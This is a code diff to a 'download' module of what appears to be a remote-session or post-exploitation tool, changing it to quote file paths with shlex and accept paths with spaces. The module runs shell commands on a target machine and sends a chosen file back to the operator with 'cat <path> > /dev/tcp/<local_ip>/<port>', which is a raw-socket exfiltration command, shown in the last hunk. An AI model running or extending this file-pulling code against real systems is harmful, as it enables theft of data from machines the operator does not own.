@@ -3,6 +3,7 @@ import ntpath
 import os
 import posixpath
 import select
+import shlex
 import socket
 import threading
 import time
@@ -15,6 +16,11 @@ def _remote_basename(path: str) -> str:
     return ntpath.basename(path) or posixpath.basename(path)
 
 
+def _shell_quote(path: str) -> str:
+    """Quote a path for safe use in a remote shell command (Linux only)."""
+    return shlex.quote(path)
+
+
 class DownloadModule(KoiModule):
     name = "download"
     description = "Download a file from the target via a dedicated TCP connection."
@@ -22,15 +28,21 @@ class DownloadModule(KoiModule):
     category = "File transfer"
     platform = ["linux", "windows_ps"]
     arguments = [
-        {"flags": ["remote_path"], "help": "Path of the file on the remote target"},
+        {
+            "flags": ["remote_path"],
+            "help": "Path of the file on the remote target (quotes optional, spaces supported)",
+            "nargs": "+",
+        },
         {"flags": ["-o", "--output"], "default": None, "help": "Local output path"},
     ]
 
     def run(self) -> None:
-        remote_path = self.args.remote_path
+        remote_path = " ".join(self.args.remote_path)
         local_path  = self.args.output or _remote_basename(remote_path)
         local_ip    = self._get_local_ip()
         os_type     = self.session.os_type
+
+        quoted = _shell_quote(remote_path)
 
         # Step 1 : existence check
         with self.spinner("Checking if file exists…"):
@@ -38,7 +50,7 @@ class DownloadModule(KoiModule):
                 token_ok  = uuid.uuid4().hex
                 token_err = uuid.uuid4().hex
                 result = self.exec(
-                    f"test -f {remote_path} && echo {token_ok} || echo {token_err}"
+                    f"test -f {quoted} && echo {token_ok} || echo {token_err}"
                 )
                 exists = result.stdout.count(token_err) < 2
             else:
@@ -52,7 +64,7 @@ class DownloadModule(KoiModule):
         # Step 2 : file size
         with self.spinner("Getting file size…"):
             if os_type == "linux":
-                size_str = self._exec_clean(f"wc -c < {remote_path}")
+                size_str = self._exec_clean(f"wc -c < {quoted}")
                 try:
                     remote_size = int(size_str.split()[0])
                 except (ValueError, IndexError):
@@ -106,7 +118,7 @@ class DownloadModule(KoiModule):
         # Step 4 : trigger remote transfer
         if os_type == "linux":
             self.exec(
-                f"cat {remote_path} > /dev/tcp/{local_ip}/{port}",
+                f"cat {quoted} > /dev/tcp/{local_ip}/{port}",
                 timeout=30,
             )
         else:
